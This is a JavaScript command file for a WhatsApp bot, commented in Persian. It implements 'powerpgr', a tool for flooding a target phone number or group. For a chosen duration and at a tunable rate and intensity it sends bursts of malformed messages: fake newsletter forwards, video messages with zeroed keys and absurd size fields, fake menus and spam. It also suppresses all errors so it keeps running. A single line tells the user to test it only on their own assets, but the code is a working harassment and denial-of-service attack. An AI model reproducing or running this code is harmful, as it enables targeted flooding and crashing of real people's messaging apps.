// commands/powerpgr.js — فشار ترکیبی Zeno-style (نسخهی کامل و نهایی)
// کومندها:
//   !powerpgr <شماره|جیدگروه> <مدت-ثانیه>
//   !powerpgr stop
//   !powerpgr boost <ms>        → نرخ ارسال (پیشفرض 160، حداقل 60)
//   !powerpgr power <شدت>       → شدت: 1 تا 10 (پیشفرض 8)
// فقط روی دارایی خودت تست کن.

export default async function powerpgr(sock, from, body, m, args = []) {
  // ---------- گارد ضدسقوط ----------
  process.on('uncaughtException', () => {});
  process.on('unhandledRejection', () => {});

  const cmd = (args[0] || '').toLowerCase();

  // راهنما
  if (!cmd || cmd === 'help') {
    return sock.sendMessage(from, { text:
      '*powerpgr • نهایی*\n\n' +
      '• !powerpgr <شماره> <ثانیه>\n   مثال: !powerpgr 989121234567 30\n' +
      '• !powerpgr <جید گروه> <ثانیه>\n' +
      '• !powerpgr stop\n' +
      '• !powerpgr boost 80\n' +
      '• !powerpgr power 10\n\n' +
      'نکته: گروه فقط با ادمین بودنِ بات + نرخ بالاتر مؤثر است.' });
  }

  // تنظیم نرخ
  if (cmd === 'boost') {
    const v = parseInt(args[1], 10);
    if (!v) return sock.sendMessage(from, { text: 'مثال: !powerpgr boost 80' });
    global.pg_gap = Math.max(60, v);
    return sock.sendMessage(from, { text: 'نرخ → ' + global.pg_gap + 'ms (زیر ~۱۲۰=ریسک بند)' });
  }

  // تنظیم شدت
  if (cmd === 'power') {
    const v = parseInt(args[1], 10);
    global.pg_power = (v && v >= 1 && v <= 10) ? v : 8;
    return sock.sendMessage(from, { text: 'شدت → ' + global.pg_power + '/10' });
  }

  // توقف
  if (cmd === 'stop') {
    if (global.pg_t) clearTimeout(global.pg_t);
    global.pg_t = null;
    return sock.sendMessage(from, { text: '⏹ متوقف شد.' });
  }

  // پارامترهای اجرا
  const GAP = global.pg_gap || 160;
  const POWER = global.pg_power || 8;
  const PER = { 1: 20, 2: 35, 3: 50, 4: 70, 5: 90, 6: 110, 7: 130, 8: 150, 9: 170, 10: 200 }[POWER];
  const target = args[0] || '';
  const jid = target.includes('@') ? target : target.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  if (!jid.includes('@')) return sock.sendMessage(from, { text: 'هدف نامعتبر. مثال: !powerpgr 989121234567 30' });

  const secs = parseInt(args[1], 10) || 0;
  const end = secs ? Date.now() + secs * 1000 : Infinity;
  if (global.pg_t) clearTimeout(global.pg_t);

  await sock.sendMessage(from, { text:
    '⚔️ شروع → ' + jid +
    (secs ? ' | ' + secs + 's' : ' | بیوقفه') +
    ' | نرخ ' + GAP + 'ms | شدت ' + POWER + '\nبا !powerpgr stop متوقف کن.' });

  // ---------- وکتورها ----------
  const txt = (t, ext = {}) => ({ text: t, contextInfo: ext });

  const newsletter = () => txt('\u200eWhatsApp\u200e', {
    isForwarded: true, forwardingScore: 999999,
    externalAdReply: { title: '\u2726\ufe0f Dittsans', body: 'Text Message', mediaType: 1, showAdAttribution: true },
    forwardedNewsletterMessageInfo: { newsletterJid: '12036333@s.whatsapp.net', newsletterName: 'WhatsApp', serverMessageId: 2 },
  });

  const media = () => ({ videoMessage: {
    url: 'https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_40057984150356712_n.enc?ccb=11-4&oh=01_QAaIX&oe=6818C29',
    directPath: '/v/t62.7161-24/13158969_599169879950168_40057984150356712_n.enc',
    mediaKey: Buffer.alloc(32), fileEncSha256: Buffer.alloc(32), fileSha256: Buffer.alloc(32),
    fileLength: 13158969, seconds: 999999999, caption: '\u200e', gifPlayback: false,
  } });

  const fakeList = () => txt('▬ MENU ▬\n' + '.attack\n.spamm\n.ownze\n.devel', {
    externalAdReply: { title: '© Zeno - 13.', body: 'Creator Script', mediaType: 1, renderLargerThumbnail: true },
  });

  // ---------- حلقهی اصلی ----------
  const tick = async () => {
    if (!global.pg_t) return;
    try {
      if (jid.endsWith('@g.us')) {
        // گروه: شامل ادیت پروتکلی (نیاز به ادمین)
        const g = await sock.groupMetadata(jid).catch(() => null);
        const parts = g ? g.participants.map(p => p.id) : [];
        if (parts.length) {
          for (let i = 0; i < PER; i++) {
            const who = parts[i % parts.length];
            try {
              await sock.sendMessage(jid, i % 2 === 0 ? newsletter() : media(), { participant: who });
            } catch (_) {}
          }
        }
      } else {
        // شخصی: چرخهی ۴ وکتور
        for (let i = 0; i < PER; i++) {
          try {
            const r = i % 4;
            if (r === 0) await sock.sendMessage(jid, newsletter());
            else if (r === 1) await sock.sendMessage(jid, media());
            else if (r === 2) await sock.sendMessage(jid, fakeList());
            else await sock.sendMessage(jid, txt('*'.repeat((i % 9) + 1)));
          } catch (_) {}
        }
      }
    } catch (_) {}
    if (Date.now() >= end) { global.pg_t = null; return; }
    global.pg_t = setTimeout(tick, GAP);
  };

  global.pg_t = setTimeout(tick, 50);
}